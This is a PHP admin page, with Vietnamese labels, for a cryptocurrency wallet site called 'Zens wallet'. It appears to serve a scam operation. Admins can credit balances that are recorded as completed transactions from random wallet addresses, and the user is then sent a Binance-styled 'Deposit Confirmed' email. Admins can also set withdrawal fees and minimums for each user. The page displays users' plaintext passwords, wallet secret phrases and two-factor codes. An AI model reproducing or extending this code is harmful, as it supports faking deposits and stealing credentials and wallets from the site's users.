<?php
require_once("../../config/config.php");
require_once("../../config/function.php");

require_once('../../class/class.smtp.php');
require_once('../../class/PHPMailerAutoload.php');
require_once('../../class/class.phpmailer.php');


require_once("../../public/admin/Header.php");
require_once("../../public/admin/Sidebar.php");


if (isset($_GET['id']) && ($user['level'] == 'admin' || $user['level'] == '2')) {
    $row = $BNZ->get_row(" SELECT * FROM `users` WHERE `id` = '" . check_string($_GET['id']) . "'  ");
    if (!$row) {
        sweet_alert("Error", "Unknow user", "error", 500, "/Admin/Home");
    }
} else {
    sweet_alert("Error", "Unknow link", "error", 500, "/Admin/Home");
}


if (isset($_POST['btnSaveUser']) && $user['level'] == 'admin') {

    $level = check_string($_POST['level']);

    $banned = check_string($_POST['banned']);

    $BNZ->update("users", array(

        'level'         => $level,

        'banned'        => $banned
    ), " `id` = '" . $row['id'] . "' ");


    $BNZ->insert("hoatdong", [
        'username' => $user['email'], 
        'content' => 'Admin '. $user['email'] . ' thay đổi user ' . $row['email'], 
        'time' => time()
    ]);

    sweet_alert("Success", "Update Successfully", "success", 500, getPresentHref());
}

if (isset($_POST['btn-2']) && ($user['level'] == 'admin' || $user['level'] == '2')) {

    $phi_rut = check_string($_POST['phi_rut']);
    $rut_toi_thieu = check_string($_POST['rut_toi_thieu']);

    if ($phi_rut < '0' || $rut_toi_thieu < '0')
        sweet_alert("Error", " Vui lòng điền hợp lệ", "error", 500, getPresentHref());

    $BNZ->update("users", array(
        'phi_rut'         => $phi_rut,
        'rut_toi_thieu'        => $rut_toi_thieu
    ), " `id` = '" . $row['id'] . "' ");


    $BNZ->insert("hoatdong", [
        'username' => $user['email'], 
        'content' => 'Admin '. $user['email'] . ' thay đổi user ' . $row['email'], 
        'time' => time()
    ]);

    sweet_alert("Success", "Update Successfully", "success", 500, getPresentHref());
}



if (isset($_POST['btnCongTien']) && ($user['level'] == 'admin' || $user['level'] == '2')) {

    $coin = check_string($_POST['coin']);
    $unit = check_string($_POST['unit']);
    $ghichu = check_string($_POST['ghichu']);
    $address = check_string($_POST['address']);

    $coin = $BNZ->get_row("SELECT * FROM `coin` WHERE `symboy` = '" . $coin . "'");
    $amount = $coin['price'] * $unit;

    $money_de = (array)json_decode($row['money']);

    $t = 'cộng tiền';
    if ($unit <= 0) {

        $t = 'trừ tiền';

        if ($money_de[$coin['symboy']] + $unit < 0) {
            sweet_alert("Error", "Vui lòng nhập số tiền hợp lệ", "error", 500, getPresentHref());
        }
    }

    $guitoi = $row['email'];
    $subject = '[Zens wallet] '.$coin['name2'] .' Deposit Confirmed';
    $bcc = $BNZ->site('webname');
    $hoten = 'User';
    $noi_dung = '
    <p style="line-height: 1;"><span style="color: rgb(0, 0, 0);">
        <img src="https://lh5.googleusercontent.com/pONziB8R1_Ag0BdH2rfXhOaszaEi468ppUe4GyD9gTb6cMSQQBqIanUq0z977YrvrtVOwZU_Rll2misg5GuxthGkZSQGG6jGZwibcW_XoVMGU93MF1MhjDeggM1ba28LM-92UnWr9PH2MM26lXC66trZW3KL-FO_"
            style="width: 485px; height: 67.3875px;"><br></span><span
        style="font-size: 26px; color: rgb(0, 0, 0);"><br></span><span style="color: rgb(0, 0, 0);"><strong><span
                style="font-size: 20px;">'.$coin['name2'].' Deposit Successful</span></strong><br><br><span
            style="font-size: 14px;">Your deposit of '.$unit.' '.$coin['name2'].' is now available in your Zens wallet account. Log in
            to check your balance. Read our&nbsp;<a href="'.$url.'Home">FAQs</a> if you are
            running into problems.<br></span></span></p>
<p style="line-height: 1;"><span style="color: rgb(0, 0, 0); font-size: 14px;">
        <a href="'.$url.'Home"><img src="https://lh6.googleusercontent.com/R5wEXrPAW96Zt5aDI9loXH6kqWgblXKYnj9FPqTPaCFTFqFy28YTzroT0pnCwjkLD_FtNb9fRzdlg07QBYZHzDzkkXK9pQI2XremEYHrEZX0Jn6uHLwNZIq6TUVyT3aQ5P-TmIHos5v1RnXm8OPH10hgzx67CcWm"
            style="width: 158px; height: 29.9526px;"
            
            ></a>
            
            <br><br>Don&rsquo;t recognize this activity? Please <a
            href="'.$url.'ForgotPassword">reset your password</a> and
        contact&nbsp;<a href="'.$url.'Home">customer support</a> immediately.<br><br>This is an
        automated message, please do not reply.</span></p>
<p style="line-height: 1;text-align: center;"><span
        style="color: blue; font-size: 14px;">______________________________________</span></p>
<p style="line-height: 1;text-align: center;"><span style="color: rgb(0, 0, 0); font-size: 14px;"><br></span><span
        style="color: rgb(41, 105, 176);"><strong><span style="font-size: 14px;">Stay
                connected!</span></strong></span><span style="color: rgb(0, 0, 0);"><br><br><a
            href="https://twitter.com/binance"><img
                src="https://lh6.googleusercontent.com/Vwmf_iPvpbiS11mO8AQrA8ZrT93Fnt6IAdaEiJ34whSk7GYxeVufNnuj1wsQfrDy3UfyB0qEHDgHwxLQyKt4EWYWbacM27PEFF9HSD9dra9r0sYxAB_Drz9s9crEO190dpZ_Q2-JnpJj8k_L8prFR4xdewYlyDLD"
                width="20" height="20"></a>&nbsp; &nbsp;<a href="https://telegram.me/BinanceExchange"><img
                src="https://lh4.googleusercontent.com/N86A_b8Uprnn-xtihf_q-A4uz90NN4_5SkwvgrTt-Fm4RoQ64fpp1hAfFdJEpQepBGawR_HJs9WWME29n1GneH-QGQetoby55jaj9OlREm-HTQ1YZC1-xnO3i6hi3-Vn0tOILBR4T0sm9E_dQsb7nX_SyS3R1uZ3"
                width="20" height="20"></a>&nbsp; &nbsp;<a href="https://www.facebook.com/binance"><img
                src="https://lh3.googleusercontent.com/T6qaeD_K2muhQkzIdK5M0fZzDwro6iQ_T8pez_Be-xuHlSKmEo8mfU2BYTdp4aK97CtFcf1KcCtECWycT4EuEMEJOHYfoFV9SyCo1w-n7Ay9XtKFZWC-rYHKoEslxemkSYfbPYF-lqhZw6H04zMOu9IqrAsA8Eys"
                width="20" height="20"></a>&nbsp; &nbsp; <a href="https://www.linkedin.com/company/binance"><img
                src="https://lh6.googleusercontent.com/BuNGF14bX-hczAy6YD7zt6q6RGUxMTRhMHz_132Sc4eqVxKnRkL_SakcvofihqSLmFJIgU5aHM8k09lFuZXbmiEP-feNKlsXQin3T2a7egBmiEmNxsBnD9rP4LGpJknoQeUu-_NMxs9FSvKHXM5rNgz64A0QiUC4"
                width="20" height="20"></a>&nbsp; &nbsp; <a
            href="https://www.youtube.com/c/BinanceYoutube/featured"><img
                src="https://lh3.googleusercontent.com/NPWBrKvhtOCB03E3QTGKOzX6TrLFGd8n65Se9ctsxsStywLCUasO6GThxXV0uavknXym5EwA6BWS_DxthXB7328ZNQEmCUJ-7xBnzVn3tBLvyMxyQXpWgeTgfLrQyNLSJO1LB9wyVOemACky3w_4Y5Jmk70j-I7C"
                width="20" height="20"></a>&nbsp; &nbsp;<a href="https://www.reddit.com/r/binance/"><img
                src="https://lh6.googleusercontent.com/BhH5Xu9XY7JY0u7hIC04EIsjWXCMj9WLZSwSAiULRl0HIlCP2z-SE8lhNAm3KdEI4znlf4bfID1hXYM0rHxEosDfWTGbiJrkWyoIrdkayHoxA1Bf_JuPTh-luc34OnYsQqDcgJn4V-LkowPfCOKaG84WUlRoPK-y"
                width="20" height="20"></a>&nbsp; &nbsp;<a href="https://instagram.com/binance"><img
                src="https://lh6.googleusercontent.com/gjxV--V8J28h7q34Gam11bv9nrMdajnI2j7SMG0e4dJjnDkUEUYVVjgxvHkaeFtv9G6bw81oOu8EFsQ16P2evGMnDZDgv-EU7Y0u5Q1rl2HzXzgj2QQGNS7SGIJx77fcBcWTqDo6PLUFwL1ujLba68Sc-fWcupgm"
                width="20" height="20"></a> </span></p>
<p style="line-height: 1;"><span style="color: rgb(0, 0, 0);"><br><span style="font-size: 11px;">To stay secure, setup your phishing code <a
                href="'.$url.'Settings">here<br><br></a><b>Risk warning:</b>&nbsp;Cryptocurrency trading is subject to high market risk. Zens wallet will make the best efforts
            to choose high-quality coins, but will not be responsible for your trading losses. Please trade with
            caution.</span></span></p>
<p style="line-height: 1;"><span style="color: rgb(0, 0, 0); font-size: 11px;"><b>Kindly note:</b>&nbsp;Please be aware of phishing sites and always
        make sure you are visiting the official Zenswallet.com website when entering sensitive data.<br><br>
        <p style="text-align: center; font-size: 11px">&copy; 2023
        Zenswallet.com, All Rights Reserved.</p>
        </span></p>
<p style="line-height: 1;"><span style="color: rgb(0, 0, 0);"><br><br><br></span></p>
<p style="line-height: 1;"><span style="color: rgb(0, 0, 0);"><br></span></p>

    ';
    sendCSM($guitoi, $hoten, $subject, $noi_dung, $bcc);


    $BNZ->insert("dongtien", [
        'coin' => $coin['symboy'],
        'sotientruoc' => $money_de[$coin['symboy']],
        'sotienthaydoi' => $unit,
        'sotiensau' => $money_de[$coin['symboy']] + $unit,
        'thoigian' => time(),
        'noidung' => 'Admin (' . $user['email'] . ') ' . $t . ' giao dịch ( ' . $unit . ' ' . $coin['name2'] . ' ) | ' . $ghichu,
        'username' => $row['email']
    ]);

    $money_de[$coin['symboy']] = $unit + $money_de[$coin['symboy']];

    $BNZ->update('users', [
        'money' => json_encode($money_de),
    ], " `id` = '" . $row['id'] . "' ");


    $BNZ->insert("transactions", array(
        'email'         => $row['email'],
        'tran_id'         => rand(11111111, 99999999),
        'unit'         => $unit,
        'coin'         => $coin['symboy'],
        'amount'         => $amount,
        'address'         => $address,
        'from_to'         => 'From',
        'confirmation'         => '10/10',
        'status' => 'Completed',
        'date' => time(),

    ));

    $BNZ->insert("hoatdong", [
        'username' => $user['email'], 
        'content' => 'Admin '. $user['email'] . ' thay đổi user ' . $row['email'], 
        'time' => time()
    ]);

    sweet_alert("Success", "Update Successfully", "success", 500, getPresentHref());
}


?>



<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1>Chỉnh sửa thành viên</h1>
                </div>
            </div>
        </div>
    </section>
    <section class="content">
        <div class="row">
            <div class="col-md-12">
                <div class="card card-outline card-primary">
                    <div class="card-header">
                        <h3 class="card-title">CHỈNH SỬA THÀNH VIÊN</h3>
                        <div class="card-tools">
                            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
                            </button>
                        </div>
                    </div>
                    <div class="card-body">
                        <form action="" method="POST">
                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">Email</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" id="inputEmail3" value="<?= $row['email']; ?>" disabled>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">Password</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" id="inputPassword3" value="<?= $row['password']; ?>" disabled>
                                    </div>
                                </div>
                            </div>

                            <input type="hidden" class="form-control" id="inputEmail3" value="<?= $row['email']; ?>" name="email" required>
                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">USDT Address</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" disabled value="<?= json_decode($row['wallet_address'])->USDTUSD4->address ?>">
                                    </div>
                                </div>
                            </div>


                            <?php $money = json_decode($row['money']) ?>



                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">IP</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="ip" value="<?= $row['ip']; ?>" disabled>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">Device</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="ip" value="<?= $row['device']; ?>" disabled>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">google_auth_code</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="google_auth_code" value="<?= $row['google_auth_code']; ?>" disabled>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">secret_phrase</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="secret_phrase" value="<?= $row['secret_phrase']; ?>" disabled>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">wallet_id</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="wallet_id" value="<?= $row['wallet_id']; ?>" disabled>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">Tổng nạp</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="total_money" value="<?= $row['total_money']; ?>" disabled>
                                    </div>
                                </div>
                            </div>




                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">Cấp độ</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="level" value="<?= $row['level']; ?>" placeholder="admin hoặc 2 hoặc để trống = user">
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="inputPassword3" class="col-sm-2 col-form-label">Trạng thái</label>
                                <div class="col-sm-10">
                                    <select class="custom-select" name="banned">
                                        <option value="<?= $row['banned']; ?>">
                                            <?php
                                            if ($row['banned'] == "0") {
                                                echo 'Hoạt động';
                                            }
                                            if ($row['banned'] == "1") {
                                                echo 'Banned';
                                            }
                                            ?>
                                        </option>
                                        <option value="0">Hoạt động</option>
                                        <option value="1">Banned</option>
                                    </select>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">Ngày đăng ký</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" id="inputEmail3" value="<?= gettime($row['createdate']) ?>" disabled>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">MONEY</label>
                                <div class="col-sm-10">
                                    <div class="row">
                                        <div class="col-md-2">
                                            <div class="form-line">
                                                <label for="" class="">BTCUSDT</label>
                                                <input type="text" class="form-control" disabled value="<?= $money->BTCUSDT; ?>">
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <div class="form-line">
                                                <label for="" class="">ETHUSDT</label>
                                                <input type="text" class="form-control" disabled value="<?= $money->ETHUSDT; ?>">
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <div class="form-line">
                                                <label for="" class="">BNBUSDT</label>
                                                <input type="text" class="form-control" disabled value="<?= $money->BNBUSDT; ?>">
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <div class="form-line">
                                                <label for="" class="">USDTUSD</label>
                                                <input type="text" class="form-control" disabled value="<?= $money->USDTUSD4; ?>">
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <div class="form-line">
                                                <label for="" class="">TRXUSDT</label>
                                                <input type="text" class="form-control" disabled value="<?= $money->TRXUSDT; ?>">
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                            <button type="submit" name="btnSaveUser" class="btn btn-primary btn-block waves-effect">
                                <span>LƯU</span>
                            </button>

                        </form>

                        <hr>

                        <form action="" method="POST">

                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">phi_rut</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="phi_rut" value="<?= $row['phi_rut']; ?>">
                                    </div>
                                </div>
                            </div>
                            <div class="form-group row">
                                <label for="inputEmail3" class="col-sm-2 col-form-label">rut_toi_thieu</label>
                                <div class="col-sm-10">
                                    <div class="form-line">
                                        <input type="text" class="form-control" name="rut_toi_thieu" value="<?= $row['rut_toi_thieu']; ?>">
                                    </div>
                                </div>
                            </div>

                            <button type="submit" name="btn-2" class="btn btn-primary btn-block waves-effect">
                                <span>LƯU</span>
                            </button>

                        </form>
                    </div>
                </div>
            </div>
            <div class="col-md-12">
                <div class="card card-outline card-success">
                    <div class="card-header">
                        <h3 class="card-title">Thay đổi số tiền</h3>
                        <div class="card-tools">
                            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
                            </button>
                        </div>
                    </div>
                    <div class="card-body">
                        <form action="" method="POST">
                            <div class="form-group ">
                                <label for="inputEmail3" class=" col-form-label">Coin</label>
                                <div class="col-sm-8">
                                    <div class="form-line">
                                        <select class="form-control" name="coin" id="coin">
                                            <option value="USDTUSD4">
                                                USDTUSD
                                            </option>
                                            <option value="BTCUSDT">
                                                BTCUSDT
                                            </option>
                                            <option value="ETHUSDT">
                                                ETHUSDT
                                            </option>
                                            <option value="BNBUSDT">
                                                BNBUSDT
                                            </option>

                                            <option value="TRXUSDT">
                                                TRXUSDT
                                            </option>

                                        </select>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group ">
                                <label for="inputEmail3" class=" col-form-label">Unit ( nhập âm để trừ tiền ) </label>
                                <div class="col-sm-8">
                                    <div class="form-line">
                                        <input type="number" class="form-control" name="unit" id="unit" step="0.0000001" required>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group ">
                                <label for="inputEmail3" class="col-form-label">Amount</label>
                                <div class="col-sm-8">
                                    <div class="form-line">
                                        <input type="number" class="form-control" id="amount" name="amount" value="0" disabled>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group ">
                                <label for="inputEmail3" class="col-form-label">Address ( Random )</label>
                                <div class="col-sm-8">
                                    <div class="form-line">
                                        <input type="text" class="form-control" id="address" name="address" value="<?= randomWalletAddres() ?>">
                                    </div>
                                </div>
                            </div>


                            <div class="form-group ">
                                <label for="inputEmail3" class=" col-form-label">Ghi chú</label>
                                <div class="col-sm-8">
                                    <div class="form-line">
                                        <textarea class="form-control" name="ghichu" rows="3" placeholder="Nhập ghi chú cộng tiền nếu có"></textarea>
                                    </div>
                                </div>
                            </div>
                            <button type="submit" name="btnCongTien" class="btn btn-primary btn-block waves-effect">
                                <span>XÁC NHẬN</span>
                            </button>
                        </form>
                    </div>
                </div>
            </div>

            <div class="col-md-12">
                <div class="card card-outline card-primary">
                    <div class="card-header">
                        <h3 class="card-title">DÒNG TIỀN</h3>
                        <div class="card-tools">
                            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
                            </button>
                        </div>
                    </div>
                    <div class="card-body">
                        <div class="table-responsive">
                            <table id="datatable" class="table table-bordered table-striped table-hover">
                                <thead>
                                    <tr>
                                        <th>STT</th>
                                        <th>Email</th>
                                        <th>Coin</th>
                                        <th>SỐ TIỀN TRƯỚC</th>
                                        <th>SỐ TIỀN THAY ĐỔI</th>
                                        <th>SỐ TIỀN HIỆN TẠI</th>
                                        <th>THỜI GIAN</th>
                                        <th>NỘI DUNG</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $i = 0;
                                    foreach ($BNZ->get_list(" SELECT * FROM `dongtien` WHERE `username` = '" . $row['email'] . "' ORDER BY id DESC ") as $u) {
                                    ?>
                                        <tr>
                                            <td><?= $i++; ?></td>
                                            <td><a href="<?= $url ?>/Admin/User/Edit/<?= $BNZ->getUser($u['username'])['id'] ?>"><?= $u['username']; ?></a></td>
                                            <td><?= $u['coin']; ?></td>
                                            <td><?= format_cash($u['sotientruoc']); ?></td>
                                            <td><?= format_cash($u['sotienthaydoi']); ?></td>
                                            <td><?= format_cash($u['sotiensau']); ?></td>
                                            <td><span class="badge badge-dark"><?= gettime($u['thoigian']) ?></span></td>
                                            <td><?= $u['noidung']; ?></td>
                                        </tr>
                                    <?php } ?>
                                </tbody>

                            </table>
                        </div>
                    </div>
                </div>
            </div>



        </div>
    </section>
</div>





<?php
require_once("../../public/admin/Footer.php");
?>

<script>
    $('#unit').on('change', function() {

        var unitz = $('#unit')
        var coin = $('#coin')

        $.ajax({
            url: '<?= $url ?>assets/ajaxs/Main.php',
            type: 'POST',
            data: {
                type: 'getAmountCoin',
                unit: unitz.val(),
                coin: coin.val()
            }
        }).done(function(res) {
            data = JSON.parse(res)
            $('#amount').val(data.amount);
        });

    })
</script>